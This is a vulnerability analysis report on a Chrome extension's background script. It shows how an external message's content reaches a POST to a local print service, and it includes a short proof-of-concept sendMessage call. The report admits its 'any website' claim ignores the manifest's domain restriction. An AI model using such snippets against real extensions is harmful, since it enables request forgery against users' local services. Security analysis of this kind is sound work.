# CoCo Analysis: ochepfkbkfklgefneemmeccghmegnibf

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → XMLHttpRequest_post_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ochepfkbkfklgefneemmeccghmegnibf/opgen_generated_files/bg.js
Line 969	    if (!request.content) {
	request.content

**Code:**

```javascript
// Background script - External message listener (bg.js, line 966)
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {
    if (!request.content) {
      appendNewStatus('Error printing. No content');
      sendResponse({message: 'Request must have content.', code: -1});
      return;
    }

    sendToPrinter(request.content, function(/*OK*/) { // ← attacker-controlled
      sendResponse({message: 'Yap!', code: 200});
    }, function(err) {
      sendResponse({message: err, code: -1});
    })

    return true;
  });

// Sink function (bg.js, line 991)
function sendToPrinter(content, callback, errorCallback) {
  var searchUrl = 'http://localhost:8099/print/';
  var x = new XMLHttpRequest();
  x.open('POST', searchUrl);
  x.responseType = 'json';
  x.onload = function() {
    if (x.status !== 200) {
      return errorCallback('Error posting content');
    }
    callback({message: 'OK!'});
  };
  x.onerror = function(err) {
    errorCallback(err);
  };

  x.send(content); // ← attacker-controlled data sent in POST body
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted website (*://*.easybizy.net/*)
// Per manifest.json externally_connectable: {"matches": ["*://*.easybizy.net/*"]}
// However, methodology states: IGNORE manifest.json restrictions on message passing

// Attacker on any website (methodology rule: assume ANY attacker can trigger)
chrome.runtime.sendMessage(
  'ochepfkbkfklgefneemmeccghmegnibf',
  { content: 'malicious payload data' },
  function(response) {
    console.log(response);
  }
);
```

**Impact:** Attacker can send arbitrary POST requests with attacker-controlled body content to localhost:8099/print/. This allows SSRF attacks against the local printing service, potentially exploiting vulnerabilities in the local print server or sending malicious print jobs.
